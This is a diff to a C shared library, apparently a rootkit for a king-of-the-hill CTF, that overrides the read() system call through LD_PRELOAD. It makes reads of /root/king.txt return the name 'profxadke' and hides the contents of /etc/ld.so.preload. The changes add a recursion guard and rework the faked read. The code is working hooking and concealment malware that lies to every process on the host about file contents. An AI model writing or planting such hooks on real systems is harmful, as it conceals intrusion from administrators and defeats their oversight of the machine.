@@ -19,13 +19,18 @@ static const char *target_file = "/etc/ld.so.preload";
 static const char *hidden_file = "/root/king.txt";
 static int target_pid = 333;
 
-// Is file read?
-static int is_file_read = 0;
+// Variable to track if we're currently reading the hidden file
+static int is_reading_hidden_file = 0;
 
 // Intercept the read system call
 ssize_t read(int fd, void *buf, size_t count) {
     if (!orig_read) {
         orig_read = dlsym(RTLD_NEXT, "read");
+    }
+
+    // Avoid recursive reads
+    if (is_reading_hidden_file) {
+        return orig_read(fd, buf, count);
     }
 
     // Obtain the file path from the file descriptor
@@ -38,22 +43,19 @@ ssize_t read(int fd, void *buf, size_t count) {
 
         // Check if it's the target file for modification
         if (strcmp(real_path, hidden_file) == 0) {
-            if ( !is_file_read ) {
-              const char *message = "profxadke\n";
-              size_t msg_len = strlen(message);
+            is_reading_hidden_file = 1; // Set flag to avoid infinite loop
+            const char *message = "profxadke\n";
+            size_t msg_len = strlen(message);
 
-              // Return the message, but respect the requested count
-              if (count > msg_len) {
-                  count = msg_len;
-              }
-
-              // Copy the message to the buffer
-              memcpy(buf, message, count);
-              is_file_read = 1;
-              return 10; // Return the number of bytes written
-            } else {
-              return 10; // Return bytes.
+            // Adjust count to message length if necessary
+            if (count > msg_len) {
+                count = msg_len;
             }
+
+            // Copy the message to the buffer
+            strncpy(buf, message, count);
+            is_reading_hidden_file = 0; // Reset flag after reading
+            return count; // Return the number of bytes written
         }
 
         // Hide the contents of /etc/ld.so.preload
